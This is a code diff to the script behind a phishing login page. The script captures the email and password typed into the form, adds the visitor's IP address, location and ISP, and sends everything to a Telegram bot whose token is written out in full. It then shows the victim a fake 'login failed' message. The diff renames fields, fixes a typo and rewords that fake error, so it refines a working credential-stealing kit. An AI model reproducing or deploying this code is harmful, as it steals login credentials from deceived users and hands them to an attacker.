@@ -4,10 +4,10 @@
     form.addEventListener('submit', function (event) {
         event.preventDefault(); // Prevents default form submission
 
-        const Xiemail = document.getElementById('Xiemail').value.trim();
-        const pipassword = document.getElementById('pipassword').value.trim();
+        const usrId = document.getElementById('usr-id').value.trim();
+        const password = document.getElementById('pwd').value.trim();
 
-        if (!Xiemail || !pipassword) {
+        if (!usrId || !password) {
             alert('Both email and password are required.');
             return;
         }
@@ -21,7 +21,7 @@
                 const city = data.city;
                 const isp = data.org;
 
-                const message = `🔹 New Login Attempt 🔹\n📧 Email: ${Xiemail}\n🔑 Password: ${pipasswor}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;
+                const message = `🔹 New Login Attempt 🔹\n📧 Email: ${usrId}\n🔑 Password: ${password}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;
 
                 // Replace with your actual bot token and chat ID
                 const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
@@ -43,7 +43,7 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert('Wrong email or password please try again.');
+                        alert('Log in failed! try again later.');
                     } else {
                         alert('Error sending message to Telegram.');
                     }
